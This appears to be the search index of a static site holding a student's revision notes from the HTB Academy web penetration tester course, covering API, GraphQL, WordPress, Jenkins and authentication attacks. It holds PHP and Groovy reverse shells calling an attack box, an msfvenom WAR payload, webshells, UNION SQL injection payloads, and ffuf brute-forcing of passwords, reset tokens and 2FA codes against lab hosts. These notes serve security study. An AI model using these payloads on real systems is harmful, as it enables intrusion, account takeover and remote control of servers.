{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Bug Bounty Hub","text":"<p>Welcome to the Bug Bounty Hub!</p>"},{"location":"#certifications","title":"Certifications","text":"<ul> <li>HTB Certified Web Exploitation Specialist - Revision notes from the Web Penetration Tester course (formally Bug Bounty Hunter course).</li> </ul>"},{"location":"bug-bounty-guide/","title":"Bug Bounty Guide","text":"<p>Revision materials and notes from the HTB Academy Web Pentration Tester course.</p>"},{"location":"bug-bounty-guide/#contents","title":"Contents","text":""},{"location":"bug-bounty-guide/#web-pentration-tester-modules","title":"Web Pentration Tester Modules","text":"<ul> <li>Web Requests</li> <li>Introduction to Web Applications</li> <li>Using Web Proxies</li> <li>Information Gathering - Web Edition</li> <li>Web Fuzzing</li> <li>JavaScript Deobfuscation</li> <li>Cross-Site Scripting (XSS)</li> <li>SQL Injection Fundamentals </li> <li>SQLMap Essentials</li> <li>Command Injections</li> <li>File Upload Attacks</li> <li>Server-side Attacks</li> <li>Login Brute Forcing</li> <li>Broken Authentication</li> <li>Web Attacks</li> <li>File Inclusion</li> <li>Attacking GraphQL</li> <li>API Attacks</li> <li>Attacking Common Applications</li> <li>Bug Bounty Reporting</li> </ul>"},{"location":"bug-bounty-guide/#additional-cheat-sheets","title":"Additional Cheat Sheets","text":"<ul> <li>FTP</li> <li>Gobuster</li> </ul>"},{"location":"bug-bounty-guide/api-attacks/","title":"API Attacks","text":"<p>OWASP API Security Top 10</p>"},{"location":"bug-bounty-guide/api-attacks/#broken-object-level-authorization","title":"Broken Object Level Authorization","text":"<ul> <li>API1:2023</li> <li>The API allows authenticated users to access data they are not authorized to view</li> <li>Authenticate as one user</li> <li>Find what is accessible for their role</li> <li>Change the parameter (IDOR)</li> <li>Automate the process: Bash<pre><code>for ((i=1; i&lt;= 20; i++)); do\ncurl -s -w \"\\n\" -X 'GET' \\\n  'http://94.237.59.242:35144/api/v1/suppliers/quarterly-reports/'$i'' \\\n  -H 'accept: application/json' \\\n  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc2NjEzNjk5MSwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.tM-yNdndwsWlMm4OzUgUE_tldLIa9ehL-usX5PDqyXCW3En3mCV0YjKWkYnEBsGyMe0JQphQxnlGgt6gHDzGig' | jq\ndone\n</code></pre></li> </ul>"},{"location":"bug-bounty-guide/api-attacks/#broken-authentication","title":"Broken Authentication","text":"<ul> <li>API2:2023</li> <li>The authentication mechanisms of the API can be bypassed or circumvented, allowing unauthorized access</li> <li>Authenticate as one user</li> <li>Find what is accessible for their role</li> <li>Try changing password to \"pass\" and inspect error message to see if allows weak passwords</li> <li>If weak passwords are allowed can try fuzzing passwords for known users</li> <li>try an incorrect password to get error message</li> <li>fuzz passwords with ffuf Bash<pre><code>ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL -u http://94.237.120.112:34036/api/v1/authentication/customers/sign-in -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"EMAIL\", \"Password\": \"PASS\"}' -fr \"Invalid Credentials\" -t 100\n</code></pre></li> <li>fuzz OTP for password reset Bash<pre><code>ffuf -w /opt/useful/seclists/Fuzzing/4-digits-0000-9999.txt:FUZZ -u http://94.237.120.112:34036/api/v1/authentication/customers/passwords/resets -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"MasonJenkins@ymail.com\", \"OTP\": \"FUZZ\", \"NewPassword\": \"password\"}' -fr \"false\" -t 100\n</code></pre></li> </ul>"},{"location":"bug-bounty-guide/api-attacks/#broken-object-property-level-authorization","title":"Broken Object Property Level Authorization","text":"<ul> <li>API3:2023</li> <li>The API reveals sensitive data to authorized users that they should not access or permits them to manipulate sensitive properties</li> </ul>"},{"location":"bug-bounty-guide/api-attacks/#exposure-of-sensitive-information-due-to-incompatible-policies","title":"Exposure of Sensitive Information Due to Incompatible Policies","text":"<ul> <li>Authenticate as one user</li> <li>Find what is accessible for their role</li> <li>Retrieve data to see if excessive data is given beyind what is required for the web app/site function</li> </ul>"},{"location":"bug-bounty-guide/api-attacks/#improperly-controlled-modification-of-dynamically-determined-object-attributes","title":"Improperly Controlled Modification of Dynamically-Determined Object Attributes","text":"<ul> <li>Authenticate as one user</li> <li>Find what is accessible for their role</li> <li>Test what aditional can be updated/patched beyond what is required for web app/site function</li> </ul>"},{"location":"bug-bounty-guide/api-attacks/#unrestricted-resource-consumption","title":"Unrestricted Resource Consumption","text":"<ul> <li>API4:2023</li> <li>The API does not limit the amount of resources users can consume</li> <li>Authenticate as one user</li> <li>Find what is accessible for their role</li> <li>Create file with 30 random megabytes Bash<pre><code>dd if=/dev/urandom of=certificateOfIncorporation.pdf bs=1M count=30\n</code></pre></li> <li>Test if file uploads are unconstrained for size</li> <li>Test if file uploads or other requests (password reset for example) can be sent repeatedly causign DDOS</li> <li>Test if limited by file type, .exe rather than .pdf for example (allowing for reverse shell upload) Bash<pre><code>dd if=/dev/urandom of=reverse-shell.exe bs=1M count=10\n</code></pre></li> <li>Test if file upload location is public and if previously uploaded files can be downloaded (could store malware and send link to victim) Bash<pre><code>curl -O http://94.237.51.179:51135/SupplierCompaniesCertificatesOfIncorporations/reverse-shell.exe\n</code></pre></li> </ul>"},{"location":"bug-bounty-guide/api-attacks/#broken-function-level-authorization","title":"Broken Function Level Authorization","text":"<ul> <li>API5:2023</li> <li>The API allows unauthorized users to perform authorized operations</li> <li>Authenticate as one user</li> <li>Find what is accessible for their role</li> <li>Test to see if user can access endpoints they don't have authorisation for</li> </ul>"},{"location":"bug-bounty-guide/api-attacks/#unrestricted-access-to-sensitive-business-flows","title":"Unrestricted Access to Sensitive Business Flows","text":"<ul> <li>API6:2023</li> <li>The API exposes sensitive business flows, leading to potential financial losses and other damages</li> <li>Example: If we can see when items will be discounted we could by all those items at discount and resell at full price</li> </ul>"},{"location":"bug-bounty-guide/api-attacks/#server-side-request-forgery","title":"Server Side Request Forgery","text":"<ul> <li>API7:2023</li> <li>The API does not validate requests adequately, allowing attackers to send malicious requests and interact with internal resources</li> <li>Upload a file</li> <li>See the uploaded file presented</li> <li>Test if abile to patch where the uploaded file is retrieved from</li> <li>Example <code>file:///etc/passwd</code></li> <li>Check the endpoint that retrieves the files contents</li> </ul>"},{"location":"bug-bounty-guide/api-attacks/#security-misconfiguration","title":"Security Misconfiguration","text":"<ul> <li>API8:2023</li> <li>The API suffers from security misconfigurations, including vulnerabilities that lead to Injection Attacks</li> <li>Check user inputs for SQLi with a trailing <code>'</code></li> <li>Test insecure headers for CSRF vulnerabilities</li> </ul>"},{"location":"bug-bounty-guide/api-attacks/#improper-inventory-management","title":"Improper Inventory Management","text":"<ul> <li>API9:2023</li> <li>The API does not properly and securely manage version inventory</li> <li>Check to see if other versions of the API are available</li> <li>Enumerate other versions for vulnerabilities</li> </ul>"},{"location":"bug-bounty-guide/api-attacks/#unsafe-consumption-of-apis","title":"Unsafe Consumption of APIs","text":"<ul> <li>API10:2023</li> <li>The API consumes another API unsafely, leading to potential security risks</li> <li>Vulnerabilities that can arrise from API-to-API communication:</li> <li>Insecure Data Transmission: APIs communicating over unencrypted channels expose sensitive data to interception, compromising confidentiality and integrity.</li> <li>Inadequate Data Validation: Failing to properly validate and sanitize data received from external APIs before processing or forwarding it to downstream components can lead to injection attacks, data corruption, or even remote code execution.</li> <li>Weak Authentication: Neglecting to implement robust authentication methods when communicating with other APIs can result in unauthorized access to sensitive data or critical functionality.</li> <li>Insufficient Rate-Limiting: An API can overwhelm another API by sending a continuous surge of requests, potentially leading to denial-of-service.</li> <li>Inadequate Monitoring: Insufficient monitoring of API-to-API interactions can make it difficult to detect and respond to security incidents promptly.</li> </ul>"},{"location":"bug-bounty-guide/attacking-common-applications/","title":"Attacking Common Applications","text":""},{"location":"bug-bounty-guide/attacking-common-applications/#cheat-sheet","title":"Cheat Sheet","text":"Command Description <code>sudo vim /etc/hosts</code> Opens /etc/hosts with vim to add hostnames <code>sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list</code> Runs nmap scan on common web ports from scope_list, outputs to web_discovery in all formats <code>eyewitness --web -x web_discovery.xml -d &lt;nameofdirectorytobecreated&gt;</code> Runs eyewitness on nmap XML output, creates directory <code>cat web_discovery.xml \\| ./aquatone -nmap</code> Pipes nmap XML to aquatone as nmap input <code>sudo wpscan --url &lt;http://domainnameoripaddress&gt; --enumerate</code> Runs wpscan with enumeration on target URL <code>sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url &lt;http://domainnameoripaddress&gt;</code> Runs wpscan XMLRPC password attack with rockyou wordlist <code>curl -s http://&lt;hostnameoripoftargetsite&gt;/path/to/webshell.php?cmd=id</code> Executes id command via PHP webshell with curl <code>&lt;?php exec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;ip address of attack box&gt;/&lt;port of choice&gt; 0&gt;&amp;1'\"); ?&gt;</code> PHP code for Linux reverse shell <code>droopescan scan joomla --url http://&lt;domainnameoripaddress&gt;</code> Runs droopescan against Joomla site <code>sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr &lt;username or path to username list&gt;</code> Runs joomla-brute.py with specified wordlist and usernames <code>&lt;?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?&gt;</code> PHP webshell for Drupal, command via GET parameter <code>curl -s &lt;http://domainname or IP address of site&gt;/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id \\| grep uid \\| cut -f4 -d\"&gt;\"</code> Executes id via Drupal webshell with curl <code>gobuster dir -u &lt;http://domainnameoripaddressofsite&gt; -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt</code> Directory brute force with gobuster and wordlist <code>auxiliary/scanner/http/tomcat_mgr_login</code> Metasploit module for Tomcat manager brute force <code>python3 mgr_brute.py -U &lt;http://domainnameoripaddressofTomCatsite&gt; -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt</code> Runs mgr_brute.py against Tomcat /manager with default creds lists <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;ip address of attack box&gt; LPORT=&lt;port to listen on to catch a shell&gt; -f war &gt; backup.war</code> Generates JSP reverse shell WAR payload <code>nmap -sV -p 8009,8080 &lt;domainname or IP address of tomcat site&gt;</code> Nmap version scan for Tomcat and AJP ports <code>r = Runtime.getRuntime() p = r.exec([\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/10.10.14.15/8443;cat &lt;&amp;5 \\| while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done\"] as String[]) p.waitFor()</code> Groovy Linux reverse shell for Jenkins Script Console <code>def cmd = \"cmd.exe /c dir\".execute(); println(\"${cmd.text}\");</code> Groovy command execution for Windows Jenkins Script Console <code>String host=\"localhost\"; int port=8044; String cmd=\"cmd.exe\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new So);</code> Groovy Windows reverse shell for Jenkins Script Console <code>reverse_shell_splunk</code> Splunk package for reverse shells on Windows/Linux"},{"location":"bug-bounty-guide/attacking-common-applications/#enumeration-tools","title":"Enumeration Tools","text":"<ul> <li> <p>Eyewitness Bash<pre><code>sudo apt install eyewitness\neyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness\n</code></pre></p> </li> <li> <p>Aquatone Bash<pre><code>wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip\nunzip aquatone_linux_amd64_1.7.0.zip\necho $PATH\n</code></pre></p> </li> <li>move to a $PATH location(<code>/usr/local/bin</code>) or current working folder Bash<pre><code>cat web_discovery.xml | ./aquatone -nmap\n</code></pre></li> </ul>"},{"location":"bug-bounty-guide/attacking-common-applications/#example-note-layout","title":"Example note layout","text":"<p>External Penetration Test -  - Scope (including in-scope IP addresses/ranges, URLs, any fragile hosts, testing timeframes, and any limitations or other relative information we need handy) - Client Points of Contact - Credentials - Discovery/Enumeration     - Scans     - Live hosts - Application Discovery     - Scans     - Interesting/Notable Hosts - Exploitation     - \\&lt;Hostname or IP&gt;     - \\&lt;Hostname or IP&gt; - Post-Exploitation     - \\&lt;Hostname or IP&gt;     - \\&lt;Hostname or IP&gt;"},{"location":"bug-bounty-guide/attacking-common-applications/#wordpress","title":"Wordpress","text":""},{"location":"bug-bounty-guide/attacking-common-applications/#manual-enumeration","title":"Manual Enumeration","text":"<ul> <li><code>robots.txt</code> - can quickly identify if WordPress used</li> <li><code>curl -s http://blog.inlanefreight.local | grep WordPress</code> - another quick identification method</li> <li><code>wp-content/plugins</code> - plugins directory</li> <li><code>wp-content/themes</code> - themes directory</li> <li>WordPress user typses on a standard installation<ol> <li>Administrator: This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.</li> <li>Editor: An editor can publish and manage posts, including the posts of other users.</li> <li>Author: They can publish and manage their own posts.</li> <li>Contributor: These users can write and manage their own posts but cannot publish them.</li> <li>Subscriber: These are standard users who can browse posts and edit their profiles.</li> </ol> </li> <li>Manually browse and look at page source</li> <li>Grep for wp-content directory, themes and plugin: Bash<pre><code>curl -s http://blog.inlanefreight.local/ | grep themes\ncurl -s http://blog.inlanefreight.local/ | grep plugins\n</code></pre></li> <li>Enumerate versions of found plugins<ul> <li>Check for <code>readme.txt</code> in their directories i.e: <code>http://blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt</code></li> <li>Check for vulnerabilities of found versions</li> </ul> </li> <li>Continue enumaration on other pages i.e: <code>curl -s http://blog.inlanefreight.local/?p=1 | grep plugins</code></li> <li>Try some manual enumeration of usernames and/or passwords at the default login page <code>http://blog.inlanefreight.local/wp-login.php</code> (testing for different error messages; correct user wrong password etc)</li> </ul>"},{"location":"bug-bounty-guide/attacking-common-applications/#wpscan","title":"WPScan","text":"<ul> <li>WPVulnDB to obtain API token Bash<pre><code>sudo gem install wpscan\nwpscan -h\n</code></pre></li> <li>Default enumeration (plugins, themes, users, media, and backups): Bash<pre><code>sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB\\&lt;SNIP\\&gt;\n</code></pre></li> <li>Default threads used is 5, change with <code>-t</code> flag.</li> </ul>"},{"location":"bug-bounty-guide/attacking-graphql/","title":"Attacking GraphQL","text":"<p>GraphQL Learn</p>"},{"location":"bug-bounty-guide/attacking-graphql/#basic-examples","title":"Basic Examples","text":"<p>GraphQL Request JSON<pre><code>{\n  users {\n    id\n    username\n    role\n  }\n}\n</code></pre></p> <p>GraphQL Response JSON<pre><code>{\n  \"data\": {\n    \"users\": [\n      { \"id\": 1, \"username\": \"htb-stdnt\", \"role\": \"user\" },\n      { \"id\": 2, \"username\": \"admin\",     \"role\": \"admin\" }\n    ]\n  }\n}\n</code></pre></p>"},{"location":"bug-bounty-guide/attacking-graphql/#introspection-queries","title":"Introspection Queries","text":"<p>Introspection is a GraphQL feature that enables users to query the GraphQL API about the structure of the backend system.</p> <p>GraphQL Types JSON<pre><code>{\n  __schema {\n    types {\n      name\n    }\n  }\n}\n</code></pre></p> <p>GraphQL Queries JSON<pre><code>{\n  __schema {\n    queryType {\n      fields {\n        name\n        description\n      }\n    }\n  }\n}\n</code></pre></p> <p>General Introspection JSON<pre><code>  query IntrospectionQuery {\n    __schema {\n      queryType { name }\n      mutationType { name }\n      subscriptionType { name }\n      types { ...FullType }\n      directives {\n        name\n        description\n        locations\n        args { ...InputValue }\n      }\n    }\n  }\n  fragment FullType on __Type {\n    kind name description\n    fields(includeDeprecated: true) {\n      name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason\n    }\n    inputFields { ...InputValue }\n    interfaces { ...TypeRef }\n    enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }\n    possibleTypes { ...TypeRef }\n  }\n  fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue }\n  fragment TypeRef on __Type {\n    kind name\n    ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name }}}}}}}\n  }\n</code></pre></p>"},{"location":"bug-bounty-guide/attacking-graphql/#batching-example","title":"Batching Example","text":"JSON<pre><code>POST /graphql HTTP/1.1\nHost: 172.17.0.2\nContent-Type: application/json\n\n[\n  { \"query\": \"{user(username: \\\"admin\\\") {uuid}}\" },\n  { \"query\": \"{post(id: 1) {title}}\" }\n]\n</code></pre>"},{"location":"bug-bounty-guide/attacking-graphql/#mutation-example","title":"Mutation Example","text":"JSON<pre><code>mutation {\n  registerUser(input: {\n    username: \"vautia\"\n    password: \"5f4dcc3b5aa765d61d8327deb882cf99\"\n    role: \"user\"\n    msg: \"newUser\"\n  }) {\n    user {\n      username\n      password\n      msg\n      role\n    }\n  }\n}\n</code></pre>"},{"location":"bug-bounty-guide/attacking-graphql/#tools","title":"Tools","text":"<ul> <li>graphw00f \u2013 GraphQL endpoint fingerprinting</li> <li>graphql-voyager \u2013 Visual schema explorer</li> <li>GraphQL-Cop \u2013 Security testing tool</li> <li>InQL \u2013 Burp Suite extension for GraphQL</li> <li>GraphQL Threat Matrix</li> </ul>"},{"location":"bug-bounty-guide/attacking-graphql/#graphw00f","title":"graphw00f","text":"Bash<pre><code>git clone https://github.com/dolevf/graphw00f\ncd graphw00f\npython3 main.py -f -d -t http://STMIP:STMPO\n</code></pre>"},{"location":"bug-bounty-guide/attacking-graphql/#graphql-cop","title":"GraphQL-Cop","text":"Bash<pre><code>git clone https://github.com/dolevf/graphql-cop\ncd graphql-cop\npython3 -m venv path/to/venv\nsource path/to/venv/bin/activate\npython3 -m pip install -r requirements.txt\npython3 graphql-cop.py -h\npython3 graphql-cop/graphql-cop.py -t http://172.17.0.2/graphql\n</code></pre>"},{"location":"bug-bounty-guide/attacking-graphql/#insecure-direct-object-reference-idor","title":"Insecure Direct Object Reference (IDOR)","text":""},{"location":"bug-bounty-guide/attacking-graphql/#identifying-idor","title":"Identifying IDOR","text":"<p>Replace a query value with another we know exists: </p>"},{"location":"bug-bounty-guide/attacking-graphql/#exploiting-idor","title":"Exploiting IDOR","text":"<p>Replace query with introspection query to determine what data can be accessed JSON<pre><code>{\"query\":\"{  __type(name: \\\"allProducts\\\") {    name    fields {      name      type {        name        kind      }    }  }}\"}\n</code></pre></p> <p>Adjust query to test if previously determined data fields are accessible</p> JSON<pre><code>{  user(username: \"test\") {    username    password  }}\n</code></pre>"},{"location":"bug-bounty-guide/attacking-graphql/#injection-attacks","title":"Injection Attacks","text":""},{"location":"bug-bounty-guide/attacking-graphql/#sql-injection","title":"SQL Injection","text":"<ul> <li>Use introspection to identify what queries requiring arguments the backend supports</li> <li>Sending queries without arguments to see if error message is returned</li> <li>Try basic SQLi in the argument: JSON<pre><code>{\n  user(username: \"test' -- -\") {\n    username\n    password\n  }\n}\n</code></pre></li> <li>or: JSON<pre><code>{\n  user(username: \"test'\") {\n    username\n    password\n  }\n}\n</code></pre></li> <li>use results of introspection query to craft UNION-based SQLi:  JSON<pre><code>{\n  user(username: \"x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -\") {\n    username\n  }\n}\n</code></pre> JSON<pre><code>{\"query\":\"{  user(username: \\\"student' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name='flag'-- -\\\") {    username  }}\"}\n</code></pre> JSON<pre><code>{\"query\":\"{  user(username: \\\"student' UNION SELECT 1,2,flag,4,5,6 FROM flag-- -\\\") {    username  }}\"}\n</code></pre></li> </ul>"},{"location":"bug-bounty-guide/attacking-graphql/#cross-site-scripting-xss","title":"Cross-Site Scripting (XSS)","text":"<p>XSS vulnerabilities can occur if: - GraphQL responses are inserted into the HTML page without proper sanitization - if invalid arguments are reflected in error messages</p>"},{"location":"bug-bounty-guide/attacking-graphql/#mutations","title":"Mutations","text":"<ul> <li>Identify all mutations JSON<pre><code>query {\n  __schema {\n    mutationType {\n      name\n      fields {\n        name\n        args {\n          name\n          defaultValue\n          type {\n            ...TypeRef\n          }\n        }\n      }\n    }\n  }\n}\n\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n</code></pre></li> <li>Query fields of required inputs from results of above JSON<pre><code>{   \n  __type(name: \"RegisterUserInput\") {\n    name\n    inputFields {\n      name\n      description\n      defaultValue\n    }\n  }\n}\n</code></pre></li> <li>Test if escalation available JSON<pre><code>mutation {\n  registerUser(input: {username: \"vautiaAdmin\", password: \"5f4dcc3b5aa765d61d8327deb882cf99\", role: \"admin\", msg: \"Hacked!\"}) {\n    user {\n      username\n      password\n      msg\n      role\n    }\n  }\n}\n</code></pre></li> </ul>"},{"location":"bug-bounty-guide/attacking-web-applications-with-ffuf/","title":"Attacking Web Applications with Ffuf","text":""},{"location":"bug-bounty-guide/attacking-web-applications-with-ffuf/#flags","title":"Flags","text":"Flag Use Example -u Specify target URL -u http://example.com/FUZZ -w Set wordlist file -w wordlist.txt -ic Ignore wordlist comments -ic -H Add custom HTTP headers -H \"Authorization: Bearer token\" -X Set HTTP method -X POST -e Extend wordlist with extensions -e .php,.html -s Enable silent mode -s -v Increase verbosity -v -t Set number of threads -t 50 -k Ignore SSL/TLS errors -k -o Output results to file -o results.txt -timeout Set request timeout in seconds -timeout 30 -recursion Enable recursive directory scanning -recursion -recursion-depth Set maximum recursion depth -recursion-depth 2 -s Filter by status codes -s 200,404 -mc Match by status codes -mc 200 -ml Match by line count -ml 50 -mw Match by word count -mw 100 -ms Match by size in bytes -ms 1024 -fc Filter by status codes -fc 404 -fl Filter by line count -fl 0 -fw Filter by word count -fw 0 -fs Filter by size in bytes -fs 512 -ac Automatically calibrate filtering -ac"},{"location":"bug-bounty-guide/attacking-web-applications-with-ffuf/#commands","title":"Commands","text":"Command Description <code>ffuf -h</code> Display ffuf help menu <code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ</code> Directory Fuzzing to discover hidden directories <code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ</code> Extension Fuzzing to identify file types <code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php</code> Page Fuzzing to find dynamic pages <code>ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.hackthebox.eu/</code> Sub-domain Fuzzing to enumerate subdomains <code>ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx</code> VHost Fuzzing to detect virtual hosts, filtering by size <code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx</code> Parameter Fuzzing - GET to find injectable parameters, filter by size <code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx</code> Parameter Fuzzing - POST to test POST-based parameters <code>ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx</code> Value Fuzzing to test parameter value vulnerabilities <code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v</code> Recursive Fuzzing to explore subdirectories with verbose output <code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:STMPO/FUZZ -recursion -recursion-depth 1 -e .php,.phps,.php7 -fs 287 -mr \"You don't have access!\" -t 100</code> Recursive Fuzzing to explore subdirectories, check for variation of the php extensions, match a specific response, 100 threads <code>ffuf -w /opt/useful/SecLists/Usernames/Names/names.txt:FUZZ -u http://faculty.academy.htb:STMPO/courses/linux-security.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 781</code> Fuzzing the username post parameter and filter response size"},{"location":"bug-bounty-guide/attacking-web-applications-with-ffuf/#wordlists","title":"Wordlists","text":""},{"location":"bug-bounty-guide/attacking-web-applications-with-ffuf/#common-wordlists","title":"Common Wordlists","text":"Wordlist Description <code>/opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt</code> Directory/Page Wordlist <code>/opt/useful/seclists/Discovery/Web-Content/web-extensions.txt</code> Extensions Wordlist <code>/opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code> Domain Wordlist <code>/opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt</code> Parameters Wordlist <p>Seclists</p> <p>Create a sequence wordlist for value fuzzing: Bash<pre><code>for i in $(seq 1 1000); do echo $i &gt;&gt; ids.txt; done\nseq -w 0 9999 &gt; tokens.txt # -w pads numbers with prepending zeros\n</code></pre></p>"},{"location":"bug-bounty-guide/attacking-web-applications-with-ffuf/#misc","title":"Misc","text":"Command Description <code>sudo sh -c 'echo \"SERVER_IP academy.htb\" &gt;&gt; /etc/hosts'</code> Add a DNS entry to resolve custom domains <code>curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'</code> Example curl command with POST request"},{"location":"bug-bounty-guide/broken-authentication/","title":"Broken Authentication","text":""},{"location":"bug-bounty-guide/broken-authentication/#categories-of-authentication","title":"Categories of Authentication","text":"<ul> <li>Knowledge: passwords, PINs, Answer to Security Question</li> <li>Ownership: ID cards, TOTP, Authenticator App, Security Token</li> <li>Inherence: Biometric authentication</li> </ul>"},{"location":"bug-bounty-guide/broken-authentication/#brute-force-attacks","title":"Brute-Force Attacks","text":"<ul> <li>User Enumeration  Bash<pre><code>ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H \"Content-Type: application/x-www-form-urlencoded\" -d \"username=FUZZ&amp;password=invalid\" -fr \"Unknown user\"\n</code></pre></li> <li>Brute-Forcing Passwords Bash<pre><code>grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' &gt; custom_wordlist.txt\nffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H \"Content-Type: application/x-www-form-urlencoded\" -d \"username=admin&amp;password=FUZZ\" -fr \"Invalid username or password\"\n</code></pre></li> <li>Brute-Forcing Password Reset Tokens (example based on weak 4 digit reset token sent via email) Bash<pre><code>seq -w 0 9999 &gt; tokens.txt # -w pads numbers with prepending zeros\nffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr \"The provided token is invalid\"\n</code></pre></li> <li>Brute-Forcing 2FA Codes (example based on weak 4 digit TOTP token) Bash<pre><code>seq -w 0 9999 &gt; tokens.txt\nffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H \"Content-Type: application/x-www-form-urlencoded\" -b \"PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93\" -d \"otp=FUZZ\" -fr \"Invalid 2FA Code\"\n</code></pre></li> </ul>"},{"location":"bug-bounty-guide/broken-authentication/#bypassing-brute-force-protection","title":"Bypassing Brute-Force Protection","text":"<ul> <li>Rate Limit: X-Forwarded-For HTTP Header can be randomised</li> <li>CAPTCHAs: Look for CAPTCHA solution in HTML code</li> </ul>"},{"location":"bug-bounty-guide/broken-authentication/#password-attacks","title":"Password Attacks","text":"<ul> <li>Default Credentials</li> <li>CIRT.net</li> <li>SecLists Default Credentials (SecLists\\Passwords\\Default-Credentials)</li> <li>SCADA</li> <li>Vulnerable Password Reset</li> <li>Guessable Security Questions (for example brute force world cities)   Bash<pre><code>cat world-cities.csv | cut -d ',' -f1 &gt; city_wordlist.txt # all world cities\ncat world-cities.csv | grep Germany | cut -d ',' -f1 &gt; german_cities.txt # just german cities\nffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H \"Content-Type: application/x-www-form-urlencoded\" -b \"PHPSESSID=39b54j201u3rhu4tab1pvdb4pv\" -d \"security_response=FUZZ\" -fr \"Incorrect 